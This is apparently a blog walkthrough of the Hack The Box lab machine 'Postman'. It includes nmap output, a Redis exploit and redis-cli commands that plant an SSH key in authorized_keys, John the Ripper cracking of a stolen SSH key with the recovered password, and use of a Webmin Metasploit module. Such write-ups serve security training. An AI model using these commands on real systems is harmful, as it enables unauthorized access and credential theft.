---
layout:     post
title:      HacktheBox Writeup - Postman - padraignix.github.io
title2:     Hack the Box - Postman
date:       2020-3-14 12:00:00 -0400
summary:    HTB Postman machine walkthrough. Postman was a quick, simple machine from HTB. We start off with a redis exploit for initial foothold, then pivot to user by using JTR to crack a backup SSH key before finally using an authenticated Webmin exploit to escalate ourselves to root.
categories: hack-the-box
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,infosec,cybersecurity,postman,redis,webmin,metasploit,john,john the ripper,jtr
thumbnail:  https://padraignix.github.io/assets/htb-postman/infocard.PNG
canon:      https://padraignix.github.io/hack-the-box/2020/03/14/htb-machine-postman/
tags:
 - htb 
 - walkthrough
 - writeup
 - redis
 - webmin
 - metasploit
 - john-the-ripper
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-postman/infocard.PNG' | relative_url }}">
</p>

<p>Postman was a quick, simple machine from HTB. We start off with a redis exploit for initial foothold, then pivot to user by using JTR to crack a backup SSH key before finally using an authenticated Webmin exploit to escalate ourselves to root. The only real tricky part of the machine was having to do a bit of guess work of the redis user's home directory. Otherwise, this machine was a welcome mental break from some of the previous harder ones like <a href="{{ site.baseurl }}{% link _posts/hackthebox/2020-3-7-htb-machine-bankrobber.md %}">Bankrobber</a> or <a href="{{ site.baseurl }}{% link _posts/hackthebox/2020-3-1-htb-machine-zetta.md %}">Zetta</a>.</p>

<h1>Initial Recon</h1>

<p>Let us kick things off with our regular NMAP scan.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Postman# nmap -sV -sV -p- 10.10.10.160
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-03 15:06 EST
Nmap scan report for 10.10.10.160
Host is up (0.017s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.02 seconds
{% endhighlight %}

<p>Alright, so trusty SSH, an Apache instance, a redis instance, and seemingly another web-based Webmin instance. Checking out the Apache instance doesn't give us all too much information.</p>

<p align="center">
<img src="{{ '/assets/htb-postman/recon-site.PNG' | relative_url }}">
</p>

<p>Unfortunately even checking the source code does not reveal more value to this page. Let's try the Webmin instance and see if we can get any further.</p>

<p align="center">
<img src="{{ '/assets/htb-postman/recon-site-miniserv.PNG' | relative_url }}">
</p>

<p>Alright this looks a bit more promising. The downside is there is no version number listed anywhere. We can try logging in using admin/admin and other default sets of credentials, however no luck with that approach. If we take a look at searchsploit for potential exploits we have quite a few options.</p>

<p align="center">
<img src="{{ '/assets/htb-postman/recon-webmin-searchsploit.PNG' | relative_url }}">
</p>

<p>We can rule out the authenticated exploits for now since we don't have a sets of credentials. After a bit of trial and error nothing pans out with the Webmin angle. One last service to check, so let's take a look at redis.</p>

<h1>User exploitation</h1>

<p>Immediately upon searching I find a several redis exploit examples. The most interesting example was from the redis author about the security of the underlaying <a href="http://antirez.com/news/96">AUTH model</a>. There is even an available <a href="https://github.com/Avinash-acid/Redis-Server-Exploit/blob/master/redis.py">repo</a> where this has been scripted up. Perfect, let's see if we can use this to get an initial shell.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Postman# python redis2.py 10.10.10.160 redis
	*******************************************************************
	* [+] [Exploit] Exploiting misconfigured REDIS SERVER*
	* [+] AVINASH KUMAR THAPA aka "-Acid"                                
	*******************************************************************


	 SSH Keys Need to be Generated
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:ehV0s6WYeZuU4WmOxs6sjnjY7ARUjlWUqy1tpaKW0X8 acid_creative
The key's randomart image is:
+---[RSA 2048]----+
|      ooo.. + .  |
|     =  .. * O   |
|    o .  .= X    |
|   .    ...B o   |
|    .. +So= +    |
|    ..=.=*       |
|     Bo=. +      |
|    =o+o..E      |
|   ..oo.o.       |
+----[SHA256]-----+
	 Keys Generated Successfully
OK
OK
OK
OK
OK
OK
	You'll get shell in sometime..Thanks for your patience
{% endhighlight %}

<p>Here is where the frustration starts... everything _seemed_ to be going well, however I did not end up getting the shell. I tried a few different variants, including running the exploit commands manually, even trying the Metasploit module which would attempt to exploit the same angle - all unsuccessfully. After a lot of headscratching and searching around I found an interesting nuance. The exploit was trying to use the "home" directory of:</p>

{% highlight shell %}
cmd4 = cmd1 + ' config set  dir' + " /home/"+username+"/.ssh/"
{% endhighlight %}

<p>However we find that a redis user sometimes uses /var/lib/. If this is the case the exploit would definitely not work as-is. Let's try modifying the exploit and using the modified home directory.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Postman# python redis2.py 10.10.10.160 redis
	*******************************************************************
	* [+] [Exploit] Exploiting misconfigured REDIS SERVER*
	* [+] AVINASH KUMAR THAPA aka "-Acid"                                
	*******************************************************************


	 SSH Keys Need to be Generated
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:ehV0s6WYeZuU4WmOxs6sjnjY7ARUjlWUqy1tpaKW0X8 acid_creative
The key's randomart image is:
+---[RSA 2048]----+
|      ooo.. + .  |
|     =  .. * O   |
|    o .  .= X    |
|   .    ...B o   |
|    .. +So= +    |
|    ..=.=*       |
|     Bo=. +      |
|    =o+o..E      |
|   ..oo.o.       |
+----[SHA256]-----+
	 Keys Generated Successfully
OK
OK
OK
OK
OK
OK
	You'll get shell in sometime..Thanks for your patience
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ 
{% endhighlight %}

<p>Alright! We have a foothold! As a side note instead of a fancy script we could achieve the same result with the following manual commands then ssh'ing to the host directly.</p>

{% highlight shell %}
redis-cli -h 10.10.10.160 flushall
cat /root/.ssh/public_key.txt | redis-cli -h 10.10.10.160 -x set cracklist
redis-cli -h 10.10.10.160 config set dbfilename "backup.db" 
redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
redis-cli -h 10.10.10.160 save
{% endhighlight %}

<p>Now that we are in, it seems that our redis user does not has access to the flag - unfortunate. We need to do a bit more digging at this point. Right in the redis home directory we see an interesting .bash_history file. Let's see if we can pick out any interesting details from there.</p>

<p align="center">
<img src="{{ '/assets/htb-postman/user-bashhistory.PNG' | relative_url }}">
</p>

<p>Excellent. We now know there is a user <code>Matt</code> and it looks like they may have backed up their SSH private key... hum, maybe we can find the file laying around.</p>

<p align="center">
<img src="{{ '/assets/htb-postman/user-rsaback.PNG' | relative_url }}">
</p>

<p>Oh-ho ho! Password protected says you. Cracking time says me. Let's get the file over to our machine and start the process. First we need to run it through sshng2john.py to get the file in a format JTR will understand.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Postman# python sshng2john.py matt.key > matt.hash
root@kali:~/Desktop/HTB/Postman# cat matt.hash
24
matt.key:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
{% endhighlight %}

<p>Making sure we remove the extra line at the start, we can then run it through John.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Postman# john --wordlist=/root/Desktop/rockyou.txt matt.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (matt.key)
1g 0:00:00:04 46.24% (ETA: 17:14:59) 0.2272g/s 1529Kp/s 1529Kc/s 1529KC/s kapoo823..kapone4115
Session aborted
{% endhighlight %}

<p>Perfect! We now have a set of credentials - <code>Matt/computer2008</code>. All that is left is to impersonate Matt.</p>

<p align="center">
<img src="{{ '/assets/htb-postman/user-owned.PNG' | relative_url }}">
</p>

<p>User down, time to hunt root!</p>

<h1>Root exploitation</h1>

<p>Root was a little simpler than getting user, mainly because we already did the recon required for escalation without knowing it at the time. Once we acquired the shell as Matt some poking around didn't really give us a logical next step. Now with a set of credentials however, maybe we can go back and use some of those authenticated Webmin exploits? First let's log in to the Webmin portal and see if we can find any additional information - maybe something like a version number.</p>

<p>Sure enough, right on the home page we see that it is running version 1.910. If we go back up to our Webmin searchsploit output.</p>

<p align="center">
<img src="{{ '/assets/htb-postman/recon-webmin-searchsploit.PNG' | relative_url }}">
</p>

<p>We see that there is a metasploit module for the exact version. Let's get it configured and see if it works as is, or if we need to tweak anything as we did with the previous redis exploit!</p>

<p align="center">
<img src="{{ '/assets/htb-postman/root-msfoptions.PNG' | relative_url }}">
</p>

<p>Alright, and now if we kick it off...</p>

<p align="center">
<img src="{{ '/assets/htb-postman/root-owned.PNG' | relative_url }}">
</p>

<p>And just like that, our journey with Postman is complete. Thanks folks, until next time.</p>